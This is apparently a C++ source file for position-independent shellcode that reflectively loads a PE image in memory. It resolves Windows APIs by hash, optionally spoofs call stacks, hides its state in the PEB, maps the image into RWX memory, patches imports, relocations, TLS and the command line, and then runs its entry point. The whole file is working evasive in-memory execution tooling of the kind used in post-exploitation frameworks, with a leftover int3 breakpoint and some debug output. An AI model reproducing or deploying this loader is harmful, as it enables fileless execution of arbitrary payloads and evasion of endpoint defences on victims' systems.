#include <General.hpp>

using namespace mscorlib;

auto DECLFN LibLoad(CHAR* LibName) -> UPTR {
	G_INSTANCE

		if (!Instance->Ctx.IsSpoof) {
			return (UPTR)Instance->Win32.LoadLibraryA(LibName);
		}

	Instance->Win32.DbgPrint("load %p\n", Instance->Win32.LoadLibraryA);

	return (UPTR)Spoof::Call((UPTR)(Instance->Win32.LoadLibraryA), 0, (UPTR)LibName);
}

auto DECLFN LoadEssentials(INSTANCE* Instance)->VOID {
	UPTR Ntdll = LoadModule(HashStr("ntdll.dll"));
	UPTR Kernel32 = LoadModule(HashStr("kernel32.dll"));
	UPTR Msvcrt = LoadModule(HashStr("msvcrt.dll"));
	UPTR Shell32 = LoadModule(HashStr("shell32.dll"));

	Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));

	if (!Shell32) LibLoad("shell32.dll");

	Instance->Win32.lstrcpyW = (decltype(Instance->Win32.lstrcpyW))LoadApi(Kernel32, HashStr("lstrcpyW"));
	Instance->Win32.swprintf = (decltype(Instance->Win32.swprintf))LoadApi(Msvcrt, HashStr("swprintf"));
	Instance->Win32.wcslen = (decltype(Instance->Win32.wcslen))LoadApi(Msvcrt, HashStr("wcslen"));
	Instance->Win32.HeapAlloc = (decltype(Instance->Win32.HeapAlloc))LoadApi(Kernel32, HashStr("HeapAlloc"));
	Instance->Win32.HeapFree = (decltype(Instance->Win32.HeapFree))LoadApi(Kernel32, HashStr("HeapFree"));
	Instance->Win32.swprintfw = (decltype(Instance->Win32.swprintfw))LoadApi(Msvcrt, HashStr("swprintfW"));
	Instance->Win32.GetProcessHeap = (decltype(Instance->Win32.GetProcessHeap))LoadApi(Kernel32, HashStr("GetProcessHeap"));

	Instance->Win32.RtlAllocateHeap = (decltype(Instance->Win32.RtlAllocateHeap))LoadApi(Ntdll, HashStr("RtlAllocateHeap"));
	Instance->Win32.RtlReAllocateHeap = (decltype(Instance->Win32.RtlReAllocateHeap))LoadApi(Ntdll, HashStr("RtlReAllocateHeap"));
	Instance->Win32.RtlFreeHeap = (decltype(Instance->Win32.RtlFreeHeap))LoadApi(Ntdll, HashStr("RtlFreeHeap"));
	Instance->Win32.RtlSecureZeroMemory = (decltype(Instance->Win32.RtlSecureZeroMemory))LoadApi(Ntdll, HashStr("RtlSecureZeroMemory"));
	Instance->Win32.RtlAddFunctionTable = (decltype(Instance->Win32.RtlAddFunctionTable))LoadApi(Ntdll, HashStr("RtlAddFunctionTable"));

	Instance->Win32.DbgPrint = (decltype(Instance->Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));
	Instance->Win32.NtClose = (decltype(Instance->Win32.NtClose))LoadApi(Ntdll, HashStr("NtClose"));

	Instance->Win32.GetProcAddress = (decltype(Instance->Win32.GetProcAddress))LoadApi(Kernel32, HashStr("GetProcAddress"));
	Instance->Win32.GetModuleHandleA = (decltype(Instance->Win32.GetModuleHandleA))LoadApi(Kernel32, HashStr("GetModuleHandleA"));

	Instance->Win32.NtAllocateVirtualMemory = (decltype(Instance->Win32.NtAllocateVirtualMemory))LoadApi(Ntdll, HashStr("NtAllocateVirtualMemory"));
	Instance->Win32.NtProtectVirtualMemory = (decltype(Instance->Win32.NtProtectVirtualMemory))LoadApi(Ntdll, HashStr("NtProtectVirtualMemory"));
	Instance->Win32.CommandLineToArgvW = (decltype(Instance->Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));

	Instance->Win32.LdrGetProcedureAddress = (decltype(Instance->Win32.LdrGetProcedureAddress))LoadApi(Ntdll, HashStr("LdrGetProcedureAddress"));
	Instance->Win32.GetConsoleWindow = (decltype(Instance->Win32.GetConsoleWindow))LoadApi(Kernel32, HashStr("GetConsoleWindow"));
	Instance->Win32.AllocConsoleWithOptions = (decltype(Instance->Win32.AllocConsoleWithOptions))LoadApi(Kernel32, HashStr("AllocConsoleWithOptions"));
	Instance->Win32.FreeConsole = (decltype(Instance->Win32.FreeConsole))LoadApi(Kernel32, HashStr("FreeConsole"));

	Instance->Win32.ReadFile = (decltype(Instance->Win32.ReadFile))LoadApi(Kernel32, HashStr("ReadFile"));
	Instance->Win32.WriteFile = (decltype(Instance->Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
	Instance->Win32.SetStdHandle = (decltype(Instance->Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
	Instance->Win32.GetStdHandle = (decltype(Instance->Win32.GetStdHandle))LoadApi(Kernel32, HashStr("GetStdHandle"));

	Instance->Win32.NtGetContextThread = (decltype(Instance->Win32.NtGetContextThread))LoadApi(Ntdll, HashStr("NtGetContextThread"));
	Instance->Win32.NtContinue = (decltype(Instance->Win32.NtContinue))LoadApi(Ntdll, HashStr("NtContinue"));
	Instance->Win32.RtlCaptureContext = (decltype(Instance->Win32.RtlCaptureContext))LoadApi(Ntdll, HashStr("RtlCaptureContext"));

	Instance->Win32.RtlAddVectoredExceptionHandler = (decltype(Instance->Win32.RtlAddVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlAddVectoredExceptionHandler"));
	Instance->Win32.RtlRemoveVectoredExceptionHandler = (decltype(Instance->Win32.RtlRemoveVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlRemoveVectoredExceptionHandler"));

	Instance->Win32.RtlInitializeCriticalSection = (decltype(Instance->Win32.RtlInitializeCriticalSection))LoadApi(Ntdll, HashStr("RtlInitializeCriticalSection"));
	Instance->Win32.RtlEnterCriticalSection = (decltype(Instance->Win32.RtlEnterCriticalSection))LoadApi(Ntdll, HashStr("RtlEnterCriticalSection"));
	Instance->Win32.RtlLeaveCriticalSection = (decltype(Instance->Win32.RtlLeaveCriticalSection))LoadApi(Ntdll, HashStr("RtlLeaveCriticalSection"));

	Instance->Win32.RtlLookupFunctionEntry = (decltype(Instance->Win32.RtlLookupFunctionEntry))LoadApi(Ntdll, HashStr("RtlLookupFunctionEntry"));
	Instance->Win32.RtlUserThreadStart = (decltype(Instance->Win32.RtlUserThreadStart))LoadApi(Ntdll, HashStr("RtlUserThreadStart"));
	Instance->Win32.BaseThreadInitThunk = (decltype(Instance->Win32.BaseThreadInitThunk))LoadApi(Kernel32, HashStr("BaseThreadInitThunk"));
	Instance->Win32.RtlExitUserThread = (decltype(Instance->Win32.RtlExitUserThread))LoadApi(Ntdll, HashStr("RtlExitUserThread"));
	Instance->Win32.RtlExitUserProcess = (decltype(Instance->Win32.RtlExitUserProcess))LoadApi(Ntdll, HashStr("RtlExitUserProcess"));
}

// Alloc virtual memory for PE
auto DECLFN AllocVm( PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocType, ULONG Protection ) -> NTSTATUS {
	G_INSTANCE

	Instance->Win32.DbgPrint("[+] Allocating virtual memory: Size=%llu, AllocType=%lu, Protection=%lu\n", *Size, AllocType, Protection);
	if ( ! Instance->Ctx.IsSpoof ) { 
		return Instance->Win32.NtAllocateVirtualMemory( 
			NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection  
		);
	} else {
		return Instance->Win32.NtAllocateVirtualMemory(
			NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection
		);
	}
}

// define memory protections
auto DECLFN ProtVm( PVOID* Address, SIZE_T* Size, ULONG NewProt, ULONG* OldProt ) -> NTSTATUS {
	G_INSTANCE

	if ( ! Instance->Ctx.IsSpoof ) {
		return Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt );
	} 

	return ( Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt ) );
}

auto DECLFN FixTls(
	_In_ PVOID Base,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID
{
	if (!DataDir || !DataDir->VirtualAddress || !DataDir->Size)
		return;

	auto TlsDir =
		(PIMAGE_TLS_DIRECTORY)((UPTR)Base + DataDir->VirtualAddress);

	// AddressOfCallBacks is a VA, NOT an RVA
	auto Callbacks =
		(PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;

	if (!Callbacks)
		return;

	for (; *Callbacks; ++Callbacks)
	{
		(*Callbacks)(
			(PVOID)Base,
			DLL_PROCESS_ATTACH,
			nullptr
			);
	}
}

auto DECLFN ValidateExceptionDirectory(
	_In_ PVOID Base,
	_In_ IMAGE_NT_HEADERS* Header
) -> BOOL {
	G_INSTANCE

		IMAGE_DATA_DIRECTORY* ExceptDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (!ExceptDir->Size || !ExceptDir->VirtualAddress) {
		Instance->Win32.DbgPrint("[*] No exception directory.\n");
		return TRUE;  // Not having exceptions is okay
	}

	PIMAGE_RUNTIME_FUNCTION_ENTRY Entry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((UPTR)Base + ExceptDir->VirtualAddress);
	DWORD EntryCount = ExceptDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);

	Instance->Win32.DbgPrint("[+] Validating %lu exception entries...\n", EntryCount);

	for (DWORD i = 0; i < EntryCount; i++) {
		// BeginAddress and EndAddress should be valid RVAs
		if (Entry[i].BeginAddress >= Header->OptionalHeader.SizeOfImage) {
			Instance->Win32.DbgPrint("[-] Exception entry %lu has invalid BeginAddress: 0x%X\n", i, Entry[i].BeginAddress);
			return FALSE;
		}
		if (Entry[i].EndAddress > Header->OptionalHeader.SizeOfImage) {
			Instance->Win32.DbgPrint("[-] Exception entry %lu has invalid EndAddress: 0x%X\n", i, Entry[i].EndAddress);
			return FALSE;
		}
		if (Entry[i].EndAddress <= Entry[i].BeginAddress) {
			Instance->Win32.DbgPrint("[-] Exception entry %lu has EndAddress <= BeginAddress\n", i);
			return FALSE;
		}
	}

	Instance->Win32.DbgPrint("[+] Exception directory validation passed.\n");
	return TRUE;
}

auto DECLFN FixExp(
	_In_ PVOID Base,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
	G_INSTANCE

	if (!DataDir || !DataDir->Size || !DataDir->VirtualAddress) {
		Instance->Win32.DbgPrint("[*] No exception directory present.\n");
		return;
	}

	PIMAGE_RUNTIME_FUNCTION_ENTRY FncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((UPTR)Base + DataDir->VirtualAddress);
	DWORD EntryCount = DataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);

	if (EntryCount == 0) {
		Instance->Win32.DbgPrint("[*] Exception directory is empty.\n");
		return;
	}

	Instance->Win32.DbgPrint("[+] Found %lu exception entries at %p\n", EntryCount, FncEntry);

	BOOL Success = Instance->Win32.RtlAddFunctionTable(
		(PRUNTIME_FUNCTION)FncEntry,
		EntryCount,
		(ULONG64)Base
	);

	if (!Success)
		Instance->Win32.DbgPrint("[-] RtlAddFunctionTable failed!\n");
	else
		Instance->Win32.DbgPrint("[+] Successfully registered %lu function table entries.\n", EntryCount);
}

auto DECLFN FixImp(
	_In_ PVOID Base,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> BOOL
{
	G_INSTANCE

		if (!DataDir || !DataDir->VirtualAddress || !DataDir->Size)
			return TRUE;

	auto ImpDesc =
		(PIMAGE_IMPORT_DESCRIPTOR)((UPTR)Base + DataDir->VirtualAddress);

	for (; ImpDesc->Name; ++ImpDesc)
	{
		auto FirstThunk =
			(IMAGE_THUNK*)((UPTR)Base + ImpDesc->FirstThunk);

		auto OrigThunk =
			ImpDesc->OriginalFirstThunk
			? (IMAGE_THUNK*)((UPTR)Base + ImpDesc->OriginalFirstThunk)
			: FirstThunk;

		auto DllName =
			(CHAR*)((UPTR)Base + ImpDesc->Name);

		PVOID DllBase =
			Instance->Win32.GetModuleHandleA(DllName);

		if (!DllBase)
			DllBase = (PVOID)LibLoad(DllName);

		if (!DllBase)
			return FALSE;

		for (; OrigThunk->u1.AddressOfData; ++OrigThunk, ++FirstThunk)
		{
			PVOID Function = nullptr;

			if (IMAGE_SNAP_BY_ORDINAL_X(OrigThunk->u1.Ordinal))
			{
				NTSTATUS st =
					Instance->Win32.LdrGetProcedureAddress(
						(HMODULE)DllBase,
						nullptr,
						IMAGE_ORDINAL_X(OrigThunk->u1.Ordinal),
						&Function
					);

				if (!NT_SUCCESS(st) || !Function)
					return FALSE;
			}
			else
			{
				auto ImportByName =
					(PIMAGE_IMPORT_BY_NAME)(
						(UPTR)Base + OrigThunk->u1.AddressOfData
						);

				ANSI_STRING Name;
				Name.Buffer = (PCHAR)ImportByName->Name;
				Name.Length = (USHORT)Str::LengthA(Name.Buffer);
				Name.MaximumLength = Name.Length + 1;

				NTSTATUS st =
					Instance->Win32.LdrGetProcedureAddress(
						(HMODULE)DllBase,
						&Name,
						0,
						&Function
					);

				if (!NT_SUCCESS(st) || !Function)
					return FALSE;
			}

			FirstThunk->u1.Function = (ULONGLONG)Function;
		}
	}

	return TRUE;
}

// Fix relocations
void FixRel(PVOID Base, UPTR Delta, IMAGE_DATA_DIRECTORY* Dir)
{
	if (!Delta || !Dir->VirtualAddress || !Dir->Size)
		return;

	auto Reloc = (PIMAGE_BASE_RELOCATION)((UPTR)Base + Dir->VirtualAddress);
	auto End = (UPTR)Reloc + Dir->Size;

	while ((UPTR)Reloc < End && Reloc->SizeOfBlock)
	{
		auto Count = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		auto Entry = (PWORD)(Reloc + 1);
		auto Page = (UPTR)Base + Reloc->VirtualAddress;

		for (UINT i = 0; i < Count; i++, Entry++)
		{
			WORD Type = *Entry >> 12;
			WORD Offset = *Entry & 0xFFF;

			if (Type == IMAGE_REL_BASED_DIR64)
				*(UPTR*)(Page + Offset) += Delta;
		}

		Reloc = (PIMAGE_BASE_RELOCATION)((UPTR)Reloc + Reloc->SizeOfBlock);
	}
}

// Fix command line arguments
auto DECLFN FixArguments(WCHAR* wArguments) -> VOID {
	G_INSTANCE

	if (!wArguments || !*wArguments)
		return;

	PPEB Peb = NtCurrentPeb();
	PRTL_USER_PROCESS_PARAMETERS pParam = Peb->ProcessParameters;

	SIZE_T len = (Instance->Win32.wcslen(wArguments) + 1) * sizeof(WCHAR);

	PWSTR NewBuf = (PWSTR)Instance->Win32.RtlAllocateHeap(
		Peb->ProcessHeap,
		HEAP_ZERO_MEMORY,
		len
	);

	if (!NewBuf)
		return;

	Mem::Copy(NewBuf, wArguments, len);

	pParam->CommandLine.Buffer = NewBuf;
	pParam->CommandLine.Length = (USHORT)(len - sizeof(WCHAR));
	pParam->CommandLine.MaximumLength = (USHORT)len;
}

auto DECLFN FixMemPermissions(
	BYTE* PeBaseAddr,
	IMAGE_NT_HEADERS* Header,
	IMAGE_SECTION_HEADER* SecHeader
) -> VOID
{
	G_INSTANCE

	for (INT i = 0; i < Header->FileHeader.NumberOfSections; i++) {

		if (!SecHeader[i].Misc.VirtualSize)
			continue;

		ULONG SecChar = SecHeader[i].Characteristics;
		ULONG NewProt = PAGE_READONLY;

		if (SecChar & IMAGE_SCN_MEM_EXECUTE) {
			NewProt = (SecChar & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
		}
		else {
			NewProt = (SecChar & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
		}

		BYTE* SectionBase = PeBaseAddr + SecHeader[i].VirtualAddress;

		UPTR ProtectBase = ALIGN_DOWN((UPTR)SectionBase, 0x1000);

		SIZE_T ProtectSize = ALIGN_UP((max(SecHeader[i].Misc.VirtualSize, SecHeader[i].SizeOfRawData)) + ((UPTR)SectionBase - ProtectBase), 0x1000 );

		PVOID ProtectBasePtr = (PVOID)ProtectBase;
		ULONG OldProt = 0;

		ProtVm(&ProtectBasePtr, &ProtectSize, NewProt, &OldProt);
	}
}

auto DECLFN Reflect( BYTE* Buffer, ULONG Size, WCHAR* Arguments ) {

	G_INSTANCE

	HANDLE  BckpStdout = INVALID_HANDLE_VALUE;
	PVOID pEntryPoint = NULL;
	
	BckpStdout = Instance->Win32.GetStdHandle(STD_OUTPUT_HANDLE);

	Instance->Win32.DbgPrint("[+] Reflective PE Loader Invoked...\n");
	Instance->Win32.DbgPrint("[+] Buffer Address: %p\n", Buffer);
	Instance->Win32.DbgPrint("[+] Buffer Size: %d\n", Size);
	
	// Validate PE file
	if ( *(USHORT*)( Buffer ) != 0x5A4D ) {
		Instance->Win32.DbgPrint("[-] Invalid PE file!\n");
		Instance->Win32.DbgPrint("[-] First bytes: %x\n", *(ULONG*)(Buffer));
		return FALSE;
	}
	ULONG oldProt = NULL;
	BYTE* PeBaseAddr = nullptr;

	Instance->Win32.DbgPrint("[+] PE file validated.\n");

	// Parse PE headers
	IMAGE_NT_HEADERS*     Header    = (IMAGE_NT_HEADERS*)( Buffer + ( (IMAGE_DOS_HEADER*)Buffer )->e_lfanew );
	IMAGE_SECTION_HEADER* SecHeader = IMAGE_FIRST_SECTION( Header );
	IMAGE_DATA_DIRECTORY* ExportDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	IMAGE_DATA_DIRECTORY* ImportDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	IMAGE_DATA_DIRECTORY* ExceptDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	IMAGE_DATA_DIRECTORY* TlsDir    = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	IMAGE_DATA_DIRECTORY* RelocDir  = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	Instance->Win32.DbgPrint("[+] Parsed PE headers.\n");

	SIZE_T RegionSize = Header->OptionalHeader.SizeOfImage;

	__asm("int3");
	// Allocate memory for PE
	AllocVm((PVOID*)&PeBaseAddr, 0, &RegionSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	Instance->Win32.DbgPrint("[+] Allocated memory for PE at: %p\n", PeBaseAddr);

	Mem::Copy(
		PeBaseAddr,
		Buffer,
		Header->OptionalHeader.SizeOfHeaders
	);
	Instance->Win32.DbgPrint("[+] Copied PE headers to allocated memory.\n");

	// Copy PE headers
	for (int i = 0; i < Header->FileHeader.NumberOfSections; i++) {

		BYTE* dst = PeBaseAddr + SecHeader[i].VirtualAddress;
		BYTE* src = Buffer + SecHeader[i].PointerToRawData;

		SIZE_T rawSize = SecHeader[i].SizeOfRawData;
		SIZE_T virtSize = SecHeader[i].Misc.VirtualSize;

		if (rawSize)
			Mem::Copy(dst, src, rawSize);

		if (virtSize > rawSize)
			Mem::Set(dst + rawSize, 0, virtSize - rawSize);
	}

	Instance->Win32.DbgPrint("[+] Copied PE sections to allocated memory.\n");

	// Fix relocations
	ULONG_PTR Delta = (ULONG_PTR)(PeBaseAddr)-Header->OptionalHeader.ImageBase;
	FixRel(PeBaseAddr, Delta, RelocDir);

	Instance->Win32.DbgPrint("[+] Fixed PE relocations.\n");

	// Fix IAT
	if (!FixImp(PeBaseAddr, ImportDir)) {
		Instance->Win32.DbgPrint("[-] Failed to fix PE imports.\n");
		return FALSE;
	}

	Instance->Win32.DbgPrint("[+] Fixed PE imports.\n");

	// Fix command line arguments
	FixArguments(Arguments);
	Instance->Win32.DbgPrint("[+] Fixed PE command line arguments.\n");

	// Fix memory permissions
	FixMemPermissions(PeBaseAddr, Header, SecHeader);
	Instance->Win32.DbgPrint("[+] Fixed PE memory permissions.\n");

	BOOL isDllFile = (Header->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;

	// Set Exception handlers
	FixExp(PeBaseAddr, ExceptDir);
	Instance->Win32.DbgPrint("[+] Fixed PE exception handlers.\n");

	// Call TLS callbacks
	FixTls(PeBaseAddr, TlsDir);
	Instance->Win32.DbgPrint("[+] Fixed PE TLS callbacks.\n");
	
	// Restore stdout and stderr
	Instance->Win32.SetStdHandle(STD_OUTPUT_HANDLE, BckpStdout);
	Instance->Win32.SetStdHandle(STD_ERROR_HANDLE, BckpStdout);

	// Calculate and execute entry point
	pEntryPoint = (PVOID)(PeBaseAddr + Header->OptionalHeader.AddressOfEntryPoint);

	if (!pEntryPoint) {
		Instance->Win32.DbgPrint("[-] Invalid entry point calculated.\n");
		return FALSE;
	}

	Instance->Win32.DbgPrint("[+] Entry point: %p (RVA: 0x%X)\n", pEntryPoint, Header->OptionalHeader.AddressOfEntryPoint);
	Instance->Win32.DbgPrint("[+] PE Base: %p\n", PeBaseAddr);
	Instance->Win32.DbgPrint("[+] Is DLL: %d\n", isDllFile);

	BOOL Result = FALSE;

	if (isDllFile) {
		typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);

		Result = ((DLLMAIN)pEntryPoint)((HINSTANCE)PeBaseAddr, DLL_PROCESS_ATTACH, NULL);
		Instance->Win32.DbgPrint("[+] DLL entry point executed. Result: %d\n", Result);
	}

	else 
	{
		typedef int(WINAPI* MAIN)();

		int ExitCode = ((MAIN)pEntryPoint)();
		Instance->Win32.DbgPrint("[+] EXE entry point executed. Exit code: %d\n", ExitCode);
		Result = (ExitCode == 0) ? TRUE : FALSE;
	}

	return Result;
}

EXTERN_C
auto DECLFN Entry( PVOID Parameter ) -> VOID {
	PARSER   Psr      = { 0 };
	INSTANCE Instance = { 0 };

	PVOID ArgBuffer = nullptr;

	NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;

	Instance.Start      = StartPtr();
	Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
	Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;

	Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)( (UPTR)Instance.Start + Instance.Size );

	LoadEssentials(&Instance);

	Instance.Win32.DbgPrint("\n\n[+] Reflection shellcode started...\n");
	
	Parser::New( &Psr, ArgBuffer );

	ULONG  Length    = 0;
	BYTE*  Buffer    = Parser::Bytes( &Psr, &Length );
	CHAR*  Arguments = Parser::Str( &Psr );

	ULONG ArgumentsL = (Str::LengthA(Arguments) + 1) * sizeof(WCHAR);

	WCHAR wArguments[MAX_PATH * 2] = { 0 };
	Str::CharToWChar(wArguments, Arguments, ArgumentsL);
	
	ULONG Result = Reflect(Buffer, Length, wArguments);

	Parser::Destroy(&Psr);

	Instance.Win32.RtlExitUserThread(Result);
}